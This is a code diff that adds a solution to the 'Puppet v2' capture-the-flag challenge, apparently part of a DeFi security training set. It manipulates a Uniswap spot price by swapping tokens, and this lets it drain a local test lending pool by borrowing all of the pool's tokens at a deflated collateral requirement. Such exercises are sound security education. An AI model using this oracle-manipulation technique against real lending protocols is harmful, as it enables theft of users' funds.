@@ -82,6 +82,51 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const getState = async(header) => {
+            console.log(`================== ${header} ==================\n`)
+            console.log('Deposit Required :: ' + ethers.utils.formatEther((await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)))+ '\n')
+            console.log('Pool ETH Balance :: ' + ethers.utils.formatEther(await ethers.provider.getBalance(this.lendingPool.address)));
+            console.log('Pool WETH Balance :: ' + ethers.utils.formatEther(await this.weth.balanceOf(this.lendingPool.address)));
+            console.log('Pool TOKEN Balance :: ' + ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address))+ '\n');
+            console.log('Attacker ETH Balance :: ' + ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+            console.log('Attacker WETH Balance :: ' + ethers.utils.formatEther(await this.weth.balanceOf(attacker.address)));
+            console.log('Attacker TOKEN Balance :: ' + ethers.utils.formatEther(await this.token.balanceOf(attacker.address))+ '\n');
+        }
+        await getState('BEFORE SWAP');
+
+        //approve uniswaprouter for swap token
+        await this.token.connect(attacker).approve(
+            this.uniswapRouter.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+        
+        //SWAP TOKEN to WETH -> Attack deposit require amount calcualtion
+        const amountIn = ATTACKER_INITIAL_TOKEN_BALANCE;
+        const amountOutMin = 0;
+        const path = [this.token.address, this.weth.address];
+        const to = attacker.address;
+        const deadline = ((await ethers.provider.getBlock('latest')).timestamp * 2);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            amountIn, amountOutMin, path, to, deadline,
+        );
+        await getState('AFTER SWAP / BEFORE DEPOSIT');
+        
+        // calculate Deposit Required for borrowing all token in pull
+        const depoitRequiredAmount = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        
+        //approve uniswaprouter for transferFrom
+        await this.weth.connect(attacker).approve(
+            this.lendingPool.address, 
+            depoitRequiredAmount
+        );
+
+        // deposit to WETH (WRAP ETH)
+        await this.weth.connect(attacker).deposit({ value: depoitRequiredAmount});
+        await getState('AFTER DEPOSIT / BEFORE BORROW');
+        
+        //borrow and get all token in pool
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE); 
+        await getState('AFTER BORROW');
     });
 
     after(async function () {
